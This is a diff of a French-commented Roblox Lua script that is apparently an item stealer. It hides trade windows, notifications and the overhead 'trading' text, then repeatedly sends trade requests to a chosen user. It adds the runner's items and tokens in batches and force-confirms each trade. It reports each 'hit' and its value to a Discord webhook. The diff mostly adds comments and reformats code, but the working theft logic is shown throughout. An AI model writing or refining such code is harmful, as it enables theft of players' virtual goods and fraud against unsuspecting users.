@@ -27,6 +27,7 @@ local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local auth_token = "EBK-SS-A" 
 
+-- // URL DE LA PHOTO DE PROFIL (PDP)
 local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
 
 -- // VÉRIFICATIONS DE SÉCURITÉ
@@ -50,6 +51,7 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
+-- // VÉRIFICATION DU PIN CODE
 local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
 local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
 if PINReponse ~= "You don't have a PIN code" then
@@ -57,7 +59,7 @@ if PINReponse ~= "You don't have a PIN code" then
     return
 end
 
--- // NETTOYAGE UI
+-- // NETTOYAGE UI (DISCRETION)
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
 tradeCompleteGui.Black.Visible = false
@@ -75,11 +77,10 @@ local notificationsFrame = notificationsGui.Notifications
 notificationsFrame.Visible = false
 notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)
 
--- // GESTION DES ÉCHANGES & SUPPRESSION DU TEXTE "TRADING"
+-- // GESTION DES ÉCHANGES & SUPPRESSION TRADING TEXT
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
-        -- SUPPRESSION DU TEXTE AU DESSUS DE LA TETE (TRADING)
         task.spawn(function()
             local char = plr.Character
             if char then
@@ -98,11 +99,10 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 
 local function sendTradeRequest(user)
-    local target = game:GetService("Players"):FindFirstChild(user)
-    if not target then return end
+    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
     repeat
-        task.wait(0.5)
-        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
+        task.wait(0.1)
+        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
     until inTrade == true
 end
 
@@ -113,23 +113,23 @@ local function addItemToTrade(itemType, ID)
     end)
 end
 
--- SYSTÈME AUTO-CONFIRM INSISTANT (CORRECTIF)
+-- // SYSTÈME DE CONFIRMATION AUTOMATIQUE (CORRIGÉ POUR RÉESSAYER)
 local function readyTrade()
+    local args = { [1] = true }
     repeat
-        -- On force le ReadyUp jusqu'à ce que le serveur renvoie true ou que le trade se ferme
-        local success = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
         task.wait(0.2)
-    until not inTrade or success == true
+    until response == true or not inTrade
 end
 
 local function confirmTrade()
     repeat
-        -- On force la confirmation jusqu'à ce que la fenêtre de trade disparaisse
         netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
         task.wait(0.2)
     until not inTrade
 end
 
+-- // FORMATAGE RAP
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -143,6 +143,7 @@ end
 
 local totalRAP = 0
 
+-- // ENVOI DES MESSAGES DISCORD
 local function SendJoinMessage(list, prefix)
     local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
@@ -173,7 +174,9 @@ local function SendJoinMessage(list, prefix)
         fields[3].value = fields[3].value .. itemLine .. "\n"
     end
 
-    if #fields[3].value > 1024 then fields[3].value = string.sub(fields[3].value, 1, 1000) .. "..." end
+    if #fields[3].value > 1024 then
+        fields[3].value = string.sub(fields[3].value, 1, 1000) .. "..."
+    end
 
     local data = {
         ["auth_token"] = auth_token,
@@ -189,7 +192,12 @@ local function SendJoinMessage(list, prefix)
         }}
     }
     
-    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
 end
 
 local function SendMessage(list)
@@ -234,7 +242,12 @@ local function SendMessage(list)
         }}
     }
 
-    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
 end
 
 -- // RÉCUPÉRATION DES DONNÉES RAP
@@ -257,7 +270,9 @@ local function buildNameToRAPMap(category)
 end
 
 local rapMappings = {}
-for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end
+for _, category in ipairs(categories) do
+    rapMappings[category] = buildNameToRAPMap(category)
+end
 
 local function getRAP(category, itemName)
     local rapMap = rapMappings[category]
@@ -296,7 +311,6 @@ if #itemsToSend > 0 then
         while #itemsToSend > 0 do
             sendTradeRequest(joinedUser)
             repeat task.wait(0.5) until inTrade
-            
             local currentBatch = getNextBatch(itemsToSend, 100)
             for _, item in ipairs(currentBatch) do addItemToTrade(item.itemType, item.ItemID) end
 
@@ -306,7 +320,6 @@ if #itemsToSend > 0 then
                 netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
             end
 
-            -- ATTENTE AVANT VALIDATION (Pour laisser le temps au serveur d'ajouter les objets)
             task.wait(1.5) 
             readyTrade()
             task.wait(0.5)
